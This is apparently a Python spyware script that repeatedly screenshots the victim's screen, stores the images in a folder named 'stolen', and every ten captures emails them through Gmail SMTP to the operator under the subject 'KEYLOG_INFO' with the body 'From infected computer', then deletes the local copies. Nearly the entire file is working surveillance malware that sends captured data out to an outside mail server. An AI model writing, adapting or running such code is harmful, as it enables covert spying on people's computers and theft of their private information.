# Sources:
# https://datatofish.com/screenshot-python/
# https://mailtrap.io/blog/python-send-email/
# https://www.justintodata.com/send-email-using-python-tutorial/

import pyautogui
import time
import smtplib
import ssl
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication

PICTURES_PER_SEND = 10
SCREENSHOT_COOLDOWN = 3
smtp_server = "smtp.gmail.com"
login = ""
password = ""
subject = "KEYLOG_INFO"


def create_mes():
    message = MIMEMultipart()
    message["From"] = login
    message["To"] = login
    message["Subject"] = subject
    body = "From infected computer"
    message.attach(MIMEText(body, "plain"))
    return message


def attach_file_to_email(message, filename):
    with open("stolen\\" + filename, "rb") as f:
        file_attachment = MIMEApplication(f.read())
    file_attachment.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )
    message.attach(file_attachment)


if __name__ == "__main__":
    if login=="" or password=="":
        raise(TypeError("Type your login and app password for your gmail"))
    if not os.path.exists("stolen"):
        os.mkdir("stolen")
        with open("stolen\log.txt", 'w'):
            pass
    port = 465
    picturesNum = 0
    message = create_mes()
    while True:
        myScreenshot = pyautogui.screenshot()
        name = time.asctime().split(" ")
        name.pop(2)
        name += name[3].split(':')
        name.pop(3)
        myScreenshot.save(rf'stolen\picture_{"_".join(name)}.png')
        picturesNum += 1
        if picturesNum < PICTURES_PER_SEND:
            time.sleep(SCREENSHOT_COOLDOWN)
            continue
        filename = os.listdir("stolen")
        for name in filename:
            attach_file_to_email(message, name)
        text = message.as_string()
        context = ssl.create_default_context()
        try:
            with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
                server.login(login, password)
                server.sendmail(
                    login, login, text
                )
        except Exception:
            continue
        print('Sent')
        for name in filename:
            if name == "log.txt":
                with open("stolen\\" + name, 'a') as f:
                    f.write(f"{'-' * 50}NEW{'-' * 50}\n")
                continue
            os.remove("stolen\\" + name)
        message = create_mes()
        picturesNum = 0
